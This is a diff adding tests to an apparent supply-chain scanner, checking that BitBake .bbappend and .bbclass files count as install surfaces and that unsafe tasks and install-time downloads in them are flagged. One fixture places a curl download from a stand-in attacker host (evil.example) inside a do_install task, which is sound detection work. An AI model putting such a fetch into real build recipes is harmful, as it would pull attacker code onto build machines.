@@ -65,3 +65,57 @@ test("an ordinary BitBake recipe keeps no finding", () => {
   expect(inspection.findings).toEqual([]);
   expect(inspection.downloads).toEqual([]);
 });
+
+test("BitBake appends and classes are install surfaces", () => {
+  // A .bbappend overlay appends to the recipe of the same name and a
+  // .bbclass file defines tasks that recipes inherit; both carry the
+  // same shell task blocks (do_compile, do_install) as a .bb recipe and
+  // BitBake runs them on the build host, so the extension decides, the
+  // same way <name>.cmake identifies a build definition.
+  for (const path of [
+    "recipes/demo/demo_1.0.bbappend",
+    "classes/custom.bbclass",
+  ]) {
+    expect({ path, surfaces: surfacesOf(path) }).toEqual({
+      path,
+      surfaces: ["installScripts", "source"],
+    });
+  }
+  const inspection = inspected(
+    "recipes/demo/demo_1.0.bbappend",
+    `do_install:append() {\n    ${PAYLOAD}\n}\n`,
+  );
+  expect(inspection.coverage.installScripts).toEqual({
+    state: "complete",
+    items: 1,
+  });
+  expect(
+    inspection.findings.map(
+      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
+    ),
+  ).toEqual(["recipes/demo/demo_1.0.bbappend:unsafe-execution:high"]);
+});
+
+test("an install-time download inside a BitBake append is recorded as a download", () => {
+  // Downloads are collected from install surfaces only. With only .bb
+  // classified, a fetch inside a .bbappend overlay recorded no download
+  // and left no gap, even though BitBake runs it while building the
+  // image.
+  const inspection = inspected(
+    "recipes/demo/dl_1.0.bbappend",
+    "do_install:append() {\n    curl -fsSL https://evil.example/payload -o /tmp/payload\n}\n",
+  );
+  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
+  expect(inspection.visibilityGaps).toEqual([
+    "Install-time download not retrieved: https://evil.example/payload",
+  ]);
+});
+
+test("an ordinary BitBake class keeps no finding", () => {
+  const inspection = inspected(
+    "classes/custom.bbclass",
+    "do_install() {\n    install -m 0755 demo $D$bindir\n}\n",
+  );
+  expect(inspection.findings).toEqual([]);
+  expect(inspection.downloads).toEqual([]);
+});
